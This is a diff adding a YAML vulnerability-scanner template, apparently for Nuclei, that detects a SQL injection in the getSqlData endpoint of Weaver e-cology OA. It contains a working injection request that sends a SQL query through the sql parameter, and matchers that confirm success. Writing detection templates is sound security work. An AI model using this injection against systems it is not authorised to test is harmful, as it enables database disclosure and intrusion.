@@ -1,0 +1,28 @@
+id: weaver-ecology-getsqldata-sqli
+info:
+  name: Weaver e-cology OA getSqlData SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Weaver e-cology system has a SQL injection vulnerability in the getSqlData parameter. Exploiting this issue can lead to sensitive database information disclosure.
+  tags: sql-injection
+  reference:
+    - https://fofa.so
+
+http:
+  - raw:
+      - |
+        GET /Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '{"api_status":true,"data"'
+      - type: word
+        words:
+          - '"status":true'
+      - type: status
+        status:
+          - 200
